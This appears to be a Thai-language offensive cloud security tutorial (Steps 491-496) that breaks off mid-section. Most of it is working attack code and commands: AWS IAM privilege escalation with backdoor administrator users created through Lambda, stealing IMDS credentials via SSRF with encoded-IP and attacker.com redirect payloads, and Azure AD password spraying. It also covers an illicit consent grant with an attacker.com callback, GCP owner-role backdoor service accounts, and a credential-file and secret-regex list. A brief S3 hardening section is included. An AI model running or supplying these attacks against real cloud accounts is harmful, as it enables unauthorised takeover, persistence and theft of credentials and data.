# Part 50: Cloud Security - AWS/Azure/GCP (Steps 491-500)

## ภาพรวม
การทดสอบความปลอดภัยบน Cloud ครอบคลุม AWS, Azure, GCP ครอบคลุม IAM, S3, metadata service, privilege escalation และ lateral movement

---

## Step 491: AWS IAM Privilege Escalation

### อธิบาย
การยกระดับสิทธิ์ใน AWS โดยใช้ IAM misconfiguration

```python
#!/usr/bin/env python3
# AWS IAM Privilege Escalation Framework

import boto3
import json
from botocore.exceptions import ClientError

IAM_PRIVESC_METHODS = {
    'CreateNewPolicyVersion': 'Create new policy version with admin rights',
    'SetDefaultPolicyVersion': 'Set older permissive version as default',
    'CreateAccessKey': 'Create access key for privileged user',
    'CreateLoginProfile': 'Create console password for privileged user',
    'UpdateLoginProfile': 'Change password of privileged user',
    'AttachUserPolicy': 'Attach admin policy to own user',
    'AttachGroupPolicy': 'Attach admin policy to own group',
    'AddUserToGroup': 'Add self to privileged group',
    'UpdateAssumeRolePolicy': 'Allow self to assume privileged role',
    'PassRole': 'Pass privileged role to service',
    'LambdaCreateFunction': 'Create Lambda with privileged role',
    'EC2RunInstances': 'Launch EC2 with instance profile'
}

class AWSPrivEscTester:
    """AWS IAM privilege escalation assessment"""
    
    def __init__(self, access_key: str = None, secret_key: str = None, 
                 session_token: str = None, region: str = 'us-east-1'):
        if access_key:
            self.session = boto3.Session(
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                aws_session_token=session_token,
                region_name=region
            )
        else:
            self.session = boto3.Session(region_name=region)
        
        self.iam = self.session.client('iam')
        self.sts = self.session.client('sts')
    
    def get_current_identity(self) -> dict:
        """ดูว่าเราเป็นใคร"""
        try:
            identity = self.sts.get_caller_identity()
            print(f"[+] Account: {identity['Account']}")
            print(f"[+] UserID: {identity['UserId']}")
            print(f"[+] ARN: {identity['Arn']}")
            return identity
        except ClientError as e:
            print(f"[-] Error: {e}")
            return {}
    
    def enumerate_permissions(self, username: str = None) -> list:
        """ตรวจสอบ permissions ของ user"""
        print("\n[*] Enumerating user permissions...")
        
        enum_commands = """
# ใช้ enumerate-iam หรือ pacu
git clone https://github.com/andresriancho/enumerate-iam
cd enumerate-iam
pip install -r requirements.txt
python3 enumerate-iam.py \\
    --access-key AKIA... \\
    --secret-key ... \\
    --region us-east-1

# หรือใช้ Pacu (AWS exploitation framework)
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu && pip install -r requirements.txt
python3 pacu.py
# > set_keys
# > run iam__enum_permissions
# > run iam__privesc_scan

# Manual enumeration
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws iam list-groups-for-user --user-name <user>
"""
        print(enum_commands)
        return []
    
    def exploit_create_policy_version(self, policy_arn: str) -> bool:
        """Create admin policy version"""
        print(f"\n[*] Exploiting CreatePolicyVersion on: {policy_arn}")
        
        admin_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": "*",
                    "Resource": "*"
                }
            ]
        }
        
        try:
            response = self.iam.create_policy_version(
                PolicyArn=policy_arn,
                PolicyDocument=json.dumps(admin_policy),
                SetAsDefault=True
            )
            print(f"[+] Created admin policy version: {response['PolicyVersion']['VersionId']}")
            return True
        except ClientError as e:
            print(f"[-] Failed: {e.response['Error']['Code']}")
            return False
    
    def exploit_attach_policy_to_self(self, username: str) -> bool:
        """Attach AdministratorAccess to self"""
        print(f"\n[*] Attaching AdministratorAccess to {username}")
        
        try:
            self.iam.attach_user_policy(
                UserName=username,
                PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
            )
            print(f"[+] Successfully attached AdministratorAccess to {username}")
            return True
        except ClientError as e:
            print(f"[-] Failed: {e.response['Error']['Code']}")
            return False
    
    def exploit_lambda_privesc(self, role_arn: str, region: str = 'us-east-1') -> bool:
        """Privilege escalation via Lambda + IAM PassRole"""
        print("\n[*] Lambda privilege escalation")
        
        lambda_code = '''
import boto3
import json

def lambda_handler(event, context):
    iam = boto3.client('iam')
    
    # Add backdoor admin user
    iam.create_user(UserName='backdoor_admin')
    iam.attach_user_policy(
        UserName='backdoor_admin',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    key = iam.create_access_key(UserName='backdoor_admin')
    
    return {
        'access_key': key['AccessKey']['AccessKeyId'],
        'secret_key': key['AccessKey']['SecretAccessKey']
    }
'''
        try:
            lambda_client = self.session.client('lambda', region_name=region)
            
            # สร้าง Lambda function
            import zipfile, io
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
                zip_file.writestr('lambda_function.py', lambda_code)
            zip_buffer.seek(0)
            
            response = lambda_client.create_function(
                FunctionName='admin_privesc',
                Runtime='python3.11',
                Role=role_arn,
                Handler='lambda_function.lambda_handler',
                Code={'ZipFile': zip_buffer.read()}
            )
            
            # Invoke Lambda
            invoke_response = lambda_client.invoke(
                FunctionName='admin_privesc',
                InvocationType='RequestResponse'
            )
            
            result = json.loads(invoke_response['Payload'].read())
            print(f"[+] Backdoor created!")
            print(f"[+] Access Key: {result.get('access_key')}")
            print(f"[+] Secret Key: {result.get('secret_key')}")
            return True
            
        except ClientError as e:
            print(f"[-] Failed: {e.response['Error']['Code']}")
            return False
    
    def create_backdoor_user(self, username: str = 'backdoor_admin'):
        """Create backdoor admin user"""
        print(f"\n[*] Creating backdoor user: {username}")
        
        try:
            self.iam.create_user(UserName=username)
            self.iam.attach_user_policy(
                UserName=username,
                PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
            )
            key = self.iam.create_access_key(UserName=username)
            
            print(f"[+] User created: {username}")
            print(f"[+] Access Key: {key['AccessKey']['AccessKeyId']}")
            print(f"[+] Secret Key: {key['AccessKey']['SecretAccessKey']}")
            
            return key['AccessKey']
        except ClientError as e:
            print(f"[-] Failed: {e.response['Error']['Code']}")
            return {}

if __name__ == '__main__':
    tester = AWSPrivEscTester()
    identity = tester.get_current_identity()
    tester.enumerate_permissions()
```

---

## Step 492: AWS S3 Bucket Security

### อธิบาย
การค้นหาและใช้ประโยชน์ S3 bucket misconfiguration

```python
#!/usr/bin/env python3
# AWS S3 Security Testing

import boto3
import requests
from botocore import UNSIGNED
from botocore.config import Config
from botocore.exceptions import ClientError

class S3SecurityTester:
    """S3 bucket security assessment"""
    
    def __init__(self):
        # Unauthenticated client (for public bucket testing)
        self.s3_anon = boto3.client(
            's3',
            config=Config(signature_version=UNSIGNED)
        )
    
    def check_public_access(self, bucket_name: str) -> dict:
        """ตรวจสอบ public access"""
        print(f"[*] Testing public access: {bucket_name}")
        findings = {}
        
        # Method 1: List objects (unauthenticated)
        try:
            response = self.s3_anon.list_objects_v2(Bucket=bucket_name)
            objects = [obj['Key'] for obj in response.get('Contents', [])]
            print(f"[+] PUBLIC LISTING! Found {len(objects)} objects")
            findings['list_objects'] = {'vulnerable': True, 'objects': objects[:10]}
        except ClientError as e:
            findings['list_objects'] = {'vulnerable': False}
        
        # Method 2: Direct URL access
        bucket_url = f"https://{bucket_name}.s3.amazonaws.com/"
        try:
            resp = requests.get(bucket_url)
            if resp.status_code == 200:
                print(f"[+] PUBLIC URL ACCESSIBLE: {bucket_url}")
                findings['public_url'] = {'vulnerable': True, 'url': bucket_url}
        except:
            pass
        
        # Method 3: Check bucket policy
        bucket_url2 = f"https://s3.amazonaws.com/{bucket_name}"
        try:
            resp2 = requests.get(bucket_url2)
            findings['direct_url'] = {'status': resp2.status_code}
        except:
            pass
        
        return findings
    
    def enumerate_bucket_contents(self, bucket_name: str) -> list:
        """ระบุเนื้อหา bucket"""
        print(f"\n[*] Enumerating: {bucket_name}")
        objects = []
        
        try:
            paginator = self.s3_anon.get_paginator('list_objects_v2')
            for page in paginator.paginate(Bucket=bucket_name):
                for obj in page.get('Contents', []):
                    objects.append({
                        'key': obj['Key'],
                        'size': obj['Size'],
                        'modified': str(obj['LastModified'])
                    })
                    print(f"  {obj['Key']} ({obj['Size']} bytes)")
        except ClientError as e:
            print(f"[-] Error: {e.response['Error']['Code']}")
        
        return objects
    
    def download_sensitive_files(self, bucket_name: str, objects: list):
        """ดาวน์โหลดไฟล์ที่สำคัญ"""
        SENSITIVE_EXTENSIONS = [
            '.env', '.pem', '.key', '.p12', '.pfx',
            '.csv', '.sql', '.db', '.bak', '.config',
            'credentials', 'secrets', 'password',
            '.aws', '.ssh', 'id_rsa', '.htpasswd'
        ]
        
        print(f"\n[*] Searching for sensitive files...")
        
        for obj in objects:
            key = obj['key'].lower()
            if any(ext in key for ext in SENSITIVE_EXTENSIONS):
                print(f"[!] SENSITIVE FILE: {obj['key']}")
                
                try:
                    response = self.s3_anon.get_object(Bucket=bucket_name, Key=obj['key'])
                    content = response['Body'].read()
                    
                    local_path = f"/tmp/s3_{obj['key'].replace('/', '_')}"
                    with open(local_path, 'wb') as f:
                        f.write(content)
                    print(f"  [+] Downloaded: {local_path}")
                except ClientError as e:
                    print(f"  [-] Cannot download: {e.response['Error']['Code']}")
    
    def scan_multiple_buckets(self, company_name: str) -> list:
        """สแกน buckets ที่สร้างจากชื่อบริษัท"""
        patterns = [
            company_name,
            f"{company_name}-backup",
            f"{company_name}-dev",
            f"{company_name}-staging",
            f"{company_name}-prod",
            f"{company_name}-data",
            f"{company_name}-logs",
            f"{company_name}-assets",
            f"{company_name}-static",
        ]
        
        print(f"[*] Scanning {len(patterns)} S3 bucket patterns for: {company_name}")
        
        found_buckets = []
        for pattern in patterns:
            result = self.check_public_access(pattern)
            if result.get('list_objects', {}).get('vulnerable'):
                found_buckets.append(pattern)
        
        return found_buckets
    
    def s3_tools_reference(self):
        """Reference commands for S3 testing"""
        tools = """
# S3 Security Tools

# 1. S3Scanner
git clone https://github.com/sa7mon/S3Scanner
python3 s3scanner.py --bucket company-backup

# 2. bucket-finder (old but works)
ruby bucket_finder.rb wordlist.txt

# 3. GrayhatWarfare (web tool)
# https://buckets.grayhatwarfare.com/

# 4. AWS CLI manual
aws s3 ls s3://bucket-name --no-sign-request  # Anon access
aws s3 sync s3://bucket-name /tmp/s3/ --no-sign-request
aws s3 cp s3://bucket-name/secrets.txt - --no-sign-request

# 5. truffleHog (search for secrets)
trufflehog s3 --bucket company-backup

# 6. S3 CORS misconfiguration test
curl -H 'Origin: https://evil.com' \\
     -H 'Access-Control-Request-Method: GET' \\
     -X OPTIONS \\
     https://bucket.s3.amazonaws.com/ -v
"""
        print(tools)

# Defense: S3 Security Best Practices
S3_HARDENING = """
# S3 Security Hardening

# 1. Block all public access (account-level)
aws s3control put-public-access-block \\
    --account-id 123456789 \\
    --public-access-block-configuration \\
    BlockPublicAcls=true,IgnorePublicAcls=true,\\
    BlockPublicPolicy=true,RestrictPublicBuckets=true

# 2. Enable S3 server-side encryption
aws s3api put-bucket-encryption \\
    --bucket my-bucket \\
    --server-side-encryption-configuration \\
    '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}'

# 3. Enable versioning
aws s3api put-bucket-versioning \\
    --bucket my-bucket \\
    --versioning-configuration Status=Enabled

# 4. Enable access logging
aws s3api put-bucket-logging \\
    --bucket my-bucket \\
    --bucket-logging-status '{"LoggingEnabled":{"TargetBucket":"log-bucket"}}'

# 5. Bucket policy example (deny public)
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyPublicReadACL",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:PutObjectAcl",
      "Resource": "arn:aws:s3:::my-bucket/*",
      "Condition": {
        "StringEquals": {
          "s3:x-amz-acl": ["public-read", "public-read-write"]
        }
      }
    }
  ]
}
"""

if __name__ == '__main__':
    tester = S3SecurityTester()
    tester.check_public_access('target-company-backup')
    tester.s3_tools_reference()
    print(S3_HARDENING)
```

---

## Step 493: AWS Metadata Service Exploitation (SSRF -> IMDS)

### อธิบาย
การใช้ SSRF เพื่อเข้าถึง AWS Instance Metadata Service (IMDS)

```python
#!/usr/bin/env python3
# AWS IMDS Exploitation via SSRF

import requests
from typing import Optional

IMDS_BASE_URL = 'http://169.254.169.254/latest'
IMDS_V2_TOKEN_URL = 'http://169.254.169.254/latest/api/token'

# ข้อมูลที่น่าสนใจใน IMDS
IMDS_PATHS = [
    '/meta-data/iam/security-credentials/',  # IAM roles
    '/meta-data/hostname',
    '/meta-data/public-ipv4',
    '/meta-data/local-ipv4',
    '/meta-data/ami-id',
    '/meta-data/instance-id',
    '/meta-data/instance-type',
    '/meta-data/placement/region',
    '/meta-data/network/interfaces/',
    '/user-data',  # Cloud-init scripts!
    '/dynamic/instance-identity/document',
]

class IMDSExploiter:
    """AWS IMDS exploitation via SSRF"""
    
    def __init__(self, ssrf_url: str):
        """
        ssrf_url: URL pattern ที่มีช่องโหว่ SSRF
        เช่น: http://target.com/fetch?url=
        """
        self.ssrf_url = ssrf_url
    
    def fetch_via_ssrf(self, target_url: str) -> Optional[str]:
        """Fetch URL ผ่าน SSRF"""
        try:
            full_url = f"{self.ssrf_url}{target_url}"
            resp = requests.get(full_url, timeout=10)
            if resp.status_code == 200:
                return resp.text
        except Exception as e:
            pass
        return None
    
    def get_iam_credentials(self) -> dict:
        """ดึง IAM credentials ผ่าน IMDS v1"""
        print("[*] Fetching IAM credentials via IMDS...")
        
        # Step 1: หา IAM role name
        roles_path = f"{IMDS_BASE_URL}/meta-data/iam/security-credentials/"
        role_name = self.fetch_via_ssrf(roles_path)
        
        if not role_name:
            print("[-] Could not fetch role name (IMDS v2 required?)")
            return self._try_imds_v2()
        
        role_name = role_name.strip()
        print(f"[+] IAM Role: {role_name}")
        
        # Step 2: ดึง credentials ของ role
        creds_path = f"{IMDS_BASE_URL}/meta-data/iam/security-credentials/{role_name}"
        creds_json = self.fetch_via_ssrf(creds_path)
        
        if creds_json:
            import json
            creds = json.loads(creds_json)
            print(f"[+] Access Key: {creds.get('AccessKeyId')}")
            print(f"[+] Secret Key: {creds.get('SecretAccessKey')}")
            print(f"[+] Token: {creds.get('Token', '')[:20]}...")
            print(f"[+] Expiration: {creds.get('Expiration')}")
            return creds
        
        return {}
    
    def _try_imds_v2(self) -> dict:
        """Try IMDS v2 สำหรับ GET request-based SSRF"""
        print("[*] Attempting IMDS v2 via SSRF...")
        
        # IMDS v2 ต้องการ PUT request เพื่อรับ token
        # SSRF แบบ GET-only จะติด
        
        imds_v2_notes = """
# IMDS v2 requires PUT request first:
TOKEN=$(curl -X PUT 'http://169.254.169.254/latest/api/token' \\
    -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')

curl -H "X-aws-ec2-metadata-token: $TOKEN" \\
    http://169.254.169.254/latest/meta-data/iam/security-credentials/

# ถ้า SSRF รองรับ PUT -> bypass IMDS v2
# ถ้าไม่รองรับ PUT -> IMDS v1 only
"""
        print(imds_v2_notes)
        return {}
    
    def get_instance_info(self) -> dict:
        """ดึงข้อมูล instance"""
        print("\n[*] Fetching instance information...")
        info = {}
        
        for path in IMDS_PATHS:
            full_path = f"{IMDS_BASE_URL}{path}"
            data = self.fetch_via_ssrf(full_path)
            if data:
                info[path] = data.strip()
                print(f"[+] {path}: {data.strip()[:80]}")
        
        return info
    
    def use_stolen_credentials(self, access_key: str, secret_key: str, session_token: str):
        """Use stolen credentials to access AWS"""
        print("\n[*] Using stolen IAM credentials...")
        
        use_creds = f"""
# ตั้งค่าใน environment variables
export AWS_ACCESS_KEY_ID='{access_key}'
export AWS_SECRET_ACCESS_KEY='{secret_key}'
export AWS_SESSION_TOKEN='{session_token}'

# ตรวจสอป identity
aws sts get-caller-identity

# ระบุ permissions
python3 enumerate-iam.py \\
    --access-key '{access_key}' \\
    --secret-key '{secret_key}' \\
    --session-token '{session_token}'

# สำรวจหา S3 buckets
aws s3 ls

# สำรวจหา EC2 instances
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,InstanceType,PublicIpAddress]'

# สำรวจหา secrets
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <secret_name>
"""
        print(use_creds)

# SSRF to IMDS payload examples
SSRF_PAYLOADS = """
# SSRF payloads for IMDS access:

# Standard
http://169.254.169.254/latest/meta-data/

# IPv6 equivalent
http://[::ffff:169.254.169.254]/latest/meta-data/

# Decimal IP
http://2852039166/latest/meta-data/

# Octal IP
http://0251.0376.0251.0376/latest/meta-data/

# URL encoded
http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/latest/meta-data/

# Redirect bypass
# สร้าง attacker server ที่ redirect ไป 169.254.169.254
# http://attacker.com/redirect -> 302 -> http://169.254.169.254/

# DNS rebinding
# DNS record: attacker.com -> 1.2.3.4 (initially)
# หลัง TTL expire: attacker.com -> 169.254.169.254
"""

if __name__ == '__main__':
    print("[*] IMDS Exploitation Demonstration")
    print("[*] Requires SSRF vulnerability in target application")
    print()
    print(SSRF_PAYLOADS)
    
    exploiter = IMDSExploiter('http://target.com/fetch?url=')
    info = exploiter.get_instance_info()
    creds = exploiter.get_iam_credentials()
```

---

## Step 494: Azure Active Directory Attacks

### อธิบาย
การโจมตี Azure Active Directory (Entra ID)

```python
#!/usr/bin/env python3
# Azure AD Security Testing

import requests
import json
from msal import PublicClientApplication, ConfidentialClientApplication

AZURE_ENDPOINTS = {
    'token': 'https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token',
    'graph': 'https://graph.microsoft.com/v1.0/',
    'management': 'https://management.azure.com/',
}

AZURE_ATTACK_TYPES = [
    'Password spray against Azure AD',
    'MFA bypass via legacy protocols',
    'Illicit consent grant attack',
    'Token theft and replay',
    'Service principal secret abuse',
    'Managed identity exploitation',
    'Azure RBAC privilege escalation',
    'Azure Key Vault secret extraction',
]

class AzureADAttacker:
    """Azure Active Directory security testing"""
    
    def __init__(self, tenant_id: str):
        self.tenant_id = tenant_id
        self.access_token = None
    
    def password_spray(self, usernames: list, password: str, client_id: str = '1b730954-1685-4b74-9bfd-dac224a7b894'):
        """ทำ password spray against Azure AD"""
        print(f"[*] Password spraying {len(usernames)} users with: {password}")
        
        for username in usernames:
            try:
                app = PublicClientApplication(
                    client_id=client_id,
                    authority=f"https://login.microsoftonline.com/{self.tenant_id}"
                )
                
                result = app.acquire_token_by_username_password(
                    username=username,
                    password=password,
                    scopes=['https://graph.microsoft.com/.default']
                )
                
                if 'access_token' in result:
                    print(f"[+] SUCCESS: {username}:{password}")
                    return {'username': username, 'token': result['access_token']}
                elif 'error_description' in result:
                    error = result['error_description']
                    if 'AADSTS50076' in error:
                        print(f"[!] MFA Required: {username} (but password correct!)")
                    elif 'AADSTS50034' in error:
                        pass  # User doesn't exist
                    else:
                        pass  # Wrong password
                        
            except Exception as e:
                pass
        
        print(f"[-] Spray failed for password: {password}")
        return {}
    
    def test_legacy_auth(self, username: str, password: str):
        """Test legacy authentication protocols (bypass MFA)"""
        print(f"\n[*] Testing legacy auth for {username}")
        
        legacy_protocols = [
            ('EWS', 'Exchange Web Services'),
            ('IMAP', 'Office 365 IMAP'),
            ('SMTP', 'Office 365 SMTP'),
            ('ActiveSync', 'Exchange ActiveSync'),
        ]
        
        for protocol, description in legacy_protocols:
            legacy_cmd = f"""
# {description} test (bypasses MFA if legacy auth enabled)
# EWS
curl -v \\
    --user '{username}:{password}' \\
    'https://outlook.office365.com/EWS/Exchange.asmx'

# IMAP
curl -v \\
    --user '{username}:{password}' \\
    'imaps://outlook.office365.com:993/INBOX'

# ตรวจสอบด้วย AADInternals
Import-Module AADInternals
Get-AADIntLoginInformation -UserName {username}
"""
            print(legacy_cmd)
    
    def illicit_consent_grant(self, app_name: str = 'Legitimate App'):
        """Illicit Consent Grant Attack"""
        print(f"\n[*] Preparing Illicit Consent Grant attack")
        
        consent_attack = f"""
# สร้าง malicious Azure App ที่ขอ permission มาก

# Step 1: Register app ใน Azure AD
# portal.azure.com -> Azure AD -> App Registrations

# Step 2: ตั้ง permissions:
# - Mail.ReadWrite
# - Contacts.ReadWrite
# - Directory.ReadWrite.All
# - offline_access

# Step 3: สร้าง consent URL
# https://login.microsoftonline.com/{self.tenant_id}/oauth2/v2.0/authorize?
#   client_id=<malicious_app_id>&
#   response_type=code&
#   redirect_uri=https://attacker.com/callback&
#   scope=Mail.ReadWrite+Contacts.ReadWrite+offline_access

# Step 4: หลอกให้ผู้ใช้คลิก consent URL
# phishing email หรือ SEO poisoning

# Step 5: เมื่อ consent แล้ว -> ได้ refresh token บน attacker server
# ใช้ token เพื่ออ่าน email/contacts

# Detect: ดู OAuth app permissions ใน Azure AD portal
az ad app list --query '[].{{name:displayName,id:appId}}'
"""
        print(consent_attack)
    
    def enumerate_azure_resources(self, access_token: str):
        """ระบุ Azure resources ด้วย Graph API"""
        print("\n[*] Enumerating Azure resources via Graph API")
        
        headers = {'Authorization': f'Bearer {access_token}'}
        
        enum_queries = {
            'users': 'https://graph.microsoft.com/v1.0/users',
            'groups': 'https://graph.microsoft.com/v1.0/groups',
            'devices': 'https://graph.microsoft.com/v1.0/devices',
            'applications': 'https://graph.microsoft.com/v1.0/applications',
            'directory_roles': 'https://graph.microsoft.com/v1.0/directoryRoles',
        }
        
        results = {}
        for resource, url in enum_queries.items():
            try:
                resp = requests.get(url, headers=headers)
                if resp.status_code == 200:
                    data = resp.json()
                    results[resource] = data.get('value', [])
                    print(f"[+] {resource}: {len(results[resource])} items")
            except Exception as e:
                print(f"[-] Error fetching {resource}: {e}")
        
        return results
    
    def extract_key_vault_secrets(self, vault_url: str, access_token: str):
        """Extract secrets from Azure Key Vault"""
        print(f"\n[*] Extracting Key Vault secrets from: {vault_url}")
        
        kv_commands = f"""
# Azure CLI ที่ authenticated

# List Key Vaults
az keyvault list

# List secrets
az keyvault secret list --vault-name <vault_name>

# Get secret value
az keyvault secret show \\
    --vault-name <vault_name> \\
    --name <secret_name> \\
    --query value

# ดึง secrets ทั้งหมด
for secret in $(az keyvault secret list --vault-name VAULT --query '[].name' -o tsv); do
    echo "$secret: $(az keyvault secret show --vault-name VAULT --name $secret --query value -o tsv)"
done

# Managed Identity เข้าถึง Key Vault
curl 'http://169.254.169.254/metadata/identity/oauth2/token?resource=https://vault.azure.net' \\
    -H 'Metadata: true' | jq .access_token
"""
        print(kv_commands)

if __name__ == '__main__':
    attacker = AzureADAttacker('target-tenant-id')
    
    users = ['user1@company.com', 'admin@company.com', 'ceo@company.com']
    result = attacker.password_spray(users, 'Spring2024!')
    
    if result.get('token'):
        attacker.enumerate_azure_resources(result['token'])
    
    attacker.illicit_consent_grant()
```

---

## Step 495: GCP Security Testing

### อธิบาย
การทดสอบความปลอดภัยใน Google Cloud Platform

```python
#!/usr/bin/env python3
# GCP Security Testing Framework

import requests
import json
import subprocess

GCP_METADATA_URL = 'http://metadata.google.internal/computeMetadata/v1/'
GCP_METADATA_HEADERS = {'Metadata-Flavor': 'Google'}

GCP_ATTACK_PATHS = [
    'Public GCS buckets',
    'Service account key abuse',
    'Workload Identity misconfiguration',
    'Metadata endpoint exploitation via SSRF',
    'BigQuery public datasets',
    'Cloud Functions misconfiguration',
    'GKE cluster misconfiguration',
    'Pub/Sub message interception',
]

class GCPSecurityTester:
    """Google Cloud Platform security assessment"""
    
    def exploit_metadata_ssrf(self, ssrf_url: str):
        """Exploit GCP metadata via SSRF"""
        print("[*] Exploiting GCP metadata service via SSRF")
        
        metadata_paths = [
            'project/',
            'instance/',
            'instance/service-accounts/',
            'instance/service-accounts/default/token',
            'instance/service-accounts/default/email',
            'instance/service-accounts/default/scopes',
            'project/project-id',
            'project/numeric-project-id',
        ]
        
        for path in metadata_paths:
            url = f"{ssrf_url}{GCP_METADATA_URL}{path}"
            print(f"[*] Fetching: {path}")
            # In real scenario: make SSRF request
        
        access_token_cmd = f"""
# Get GCP access token via SSRF
curl -H 'Metadata-Flavor: Google' \\
    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'

# Response:
# {{"access_token": "ya29.xxx", "expires_in": 3600, "token_type": "Bearer"}}

# Use token
export GCP_TOKEN='ya29.xxx'
curl -H "Authorization: Bearer $GCP_TOKEN" \\
    'https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$GCP_TOKEN'

# List GCS buckets
curl -H "Authorization: Bearer $GCP_TOKEN" \\
    'https://storage.googleapis.com/storage/v1/b?project=PROJECT_ID'
"""
        print(access_token_cmd)
    
    def test_public_gcs_buckets(self, project_name: str):
        """Test for public GCS buckets"""
        print(f"\n[*] Testing public GCS buckets for: {project_name}")
        
        # ตรวจสอบ public bucket
        bucket_patterns = [
            project_name,
            f"{project_name}-backup",
            f"{project_name}-data",
            f"{project_name}-public",
        ]
        
        for bucket in bucket_patterns:
            url = f"https://storage.googleapis.com/{bucket}"
            try:
                resp = requests.get(url)
                if resp.status_code == 200:
                    print(f"[+] PUBLIC GCS BUCKET: gs://{bucket}")
            except:
                pass
        
        # ใช้ gsutil
        gsutil_cmds = """
# ตรวจสอบ anonymous access
gsutil ls gs://bucket-name
gsutil ls -r gs://bucket-name/
gsutil cat gs://bucket-name/sensitive-file.txt

# ใช้ GCPBucketBrute
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute
python3 GCPBucketBrute.py \\
    --keyword company \\
    --output /tmp/gcs_results.txt
"""
        print(gsutil_cmds)
    
    def exploit_service_account_key(self, key_file: str):
        """ใช้ service account key ที่หลุดมา"""
        print(f"\n[*] Exploiting service account key: {key_file}")
        
        exploit_cmds = f"""
# Authenticate ด้วย service account key
gcloud auth activate-service-account \\
    --key-file={key_file}

# สำรวจ resources
gcloud projects list
gcloud compute instances list
gcloud storage buckets list
gcloud iam service-accounts list

# Escalate หากมี setIamPolicy permission
gcloud projects add-iam-policy-binding PROJECT_ID \\
    --member='serviceAccount:compromised@PROJECT.iam.gserviceaccount.com' \\
    --role='roles/owner'

# สร้าง backdoor service account
gcloud iam service-accounts create backdoor-admin
gcloud projects add-iam-policy-binding PROJECT_ID \\
    --member='serviceAccount:backdoor-admin@PROJECT.iam.gserviceaccount.com' \\
    --role='roles/owner'
gcloud iam service-accounts keys create /tmp/backdoor_key.json \\
    --iam-account backdoor-admin@PROJECT.iam.gserviceaccount.com
"""
        print(exploit_cmds)
    
    def enumerate_gcp_permissions(self):
        """Enumerate GCP permissions"""
        enum_cmds = """
# ใช้ GCP-IAM-Enum
git clone https://github.com/google/gcp-iam-enum

# Manual enumeration
gcloud projects get-iam-policy PROJECT_ID
gcloud compute instances list
gcloud functions list
gcloud sql instances list
gcloud container clusters list

# Test permissions
gcloud projects test-iam-permissions PROJECT_ID \\
    --permissions compute.instances.create,iam.roles.update
"""
        print(enum_cmds)
    
    def exploit_gke_misconfiguration(self, cluster_endpoint: str):
        """Exploit GKE cluster misconfiguration"""
        print(f"\n[*] Testing GKE cluster: {cluster_endpoint}")
        
        gke_attacks = f"""
# ตรวจสอบ GKE anonymous access
curl https://{cluster_endpoint}/api/v1/pods
curl https://{cluster_endpoint}/api/v1/namespaces

# ถ้าไม่ require auth -> critical!

# ใช้ service account จาก pod
# Inside pod:
curl -k https://kubernetes.default.svc/api/v1/secrets \\
    -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"

# Escalate ผ่าน GKE Metadata service
curl -H 'Metadata-Flavor: Google' \\
    http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
"""
        print(gke_attacks)

if __name__ == '__main__':
    tester = GCPSecurityTester()
    tester.exploit_metadata_ssrf('http://target.com/fetch?url=')
    tester.test_public_gcs_buckets('target-company')
    tester.enumerate_gcp_permissions()
```

---

## Step 496: Cloud Secrets Management Attacks

### อธิบาย
การค้นหาและดึง secrets จาก cloud environments

```python
#!/usr/bin/env python3
# Cloud Secrets Discovery and Extraction

import re
import os
import subprocess
from pathlib import Path

SECRET_PATTERNS = {
    'aws_access_key': r'AKIA[0-9A-Z]{16}',
    'aws_secret_key': r'(?i)aws.{0,20}secret.{0,20}[\'"]([0-9a-zA-Z/+]{40})',
    'gcp_service_account': r'"type": "service_account"',
    'azure_client_secret': r'(?i)azure.{0,20}secret.{0,20}[\'"]([a-zA-Z0-9._-]{34,})',
    'github_token': r'ghp_[0-9a-zA-Z]{36}',
    'slack_token': r'xox[baprs]-[0-9a-zA-Z]{10,48}',
    'jwt_token': r'eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*',
    'private_key': r'-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----',
}

CLOUD_SECRETS_LOCATIONS = [
    '~/.aws/credentials',
    '~/.aws/config',
    '~/.config/gcloud/application_default_credentials.json',
    '~/.azure/credentials',
    '/etc/environment',
    '.env',
    '.env.local',
    '.env.production',
    'docker-compose.yml',
    'kubernetes.yaml',
    '**/*.tfvars',
    '**/terraform.tfstate',
]

class CloudSecretsHunter:
    """Cloud secrets discovery and extraction"""
    
    def scan_code_repository(self, repo_path: str) -> list:
        """สแกน code repository หา secrets"""
        print(f"[*] Scanning repository: {repo_path}")
        findings = []
        
        # Tools
        scan_tools = f"""
# 1. truffleHog
trufflehog filesystem {repo_path} --json

# 2. gitleaks
gitleaks detect \\
    --source={repo_path} \\
    --report-format json \\
    --report-path /tmp/gitleaks_report.json

# 3. detect-secrets
detect-secrets scan {repo_path} > /tmp/secrets_baseline.json

# 4. git-secrets (scan history)
git -C {repo_path} log --all --format='%H' | xargs git -C {repo_path} show | grep -E 'AKIA|password|secret'

# 5. Semgrep secrets
semgrep --config=p/secrets {repo_path}
"""
        print(scan_tools)
        return findings
    
    def scan_git_history(self, repo_path: str) -> list:
        """สแกน git history"""
        print(f"\n[*] Scanning git history in: {repo_path}")
        
        history_scan = f"""
# Scan ทุก commit
trufflehog git file://{repo_path}

# gitleaks scan ทุก branches
gitleaks detect \\
    --source={repo_path} \\
    --no-git=false

# Manual: Search in git objects
